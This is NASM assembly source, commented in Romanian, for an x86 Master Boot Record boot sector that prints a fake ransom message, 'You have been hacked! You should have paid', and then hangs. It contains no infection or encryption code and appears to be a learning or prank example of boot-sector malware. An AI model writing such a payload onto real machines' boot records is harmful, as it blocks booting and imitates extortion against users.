;----------------------------------------------;
; Vom folosi utilitarul nasm pentru compilarea in limbaj x86- valabil pe majoritatea masiniilor de calcul
; nasm -f bin asmCode.asm -o data.bin
;
;
;
;----------------------------------------------;
 
BITS 16
ORG     0x7c00                  ;Adresa block-ului MBR- 512
 
jmp start
 
start:
        mov ax,cs
        mov ds,ax
        mov si,msg          ;Mutam in SI adresa mesajului.
        call print
 
print:
        push ax
        cld
next:
        mov al,[si]             
        cmp al,0            ;Verificam pentru 0
        je done             ;Jump on equal la sfarsit
        call printchar      ;Afiseaza caracterul curent
        inc si              ;Avanseaza o pozitie
        jmp next            ;repta
done:
        jmp $               ;Ramai blocat
 
printchar:
        mov ah,0x0e         ;Adresa rutinei pentru print char
        int 0x10            ;intrerupere 0x10
        ret
  
msg:            db        "Oh no! You have been hacked! You should have paid", 0
;----------------------------------------------;
; Bootloader signature must be located
; at bytes #511 and #512.
; Fill with 0 in between.
; $  = address of the current line
; $$ = address of the 1st instruction
;----------------------------------------------;
  
times 510 - ($-$$) db 0
dw        0xaa55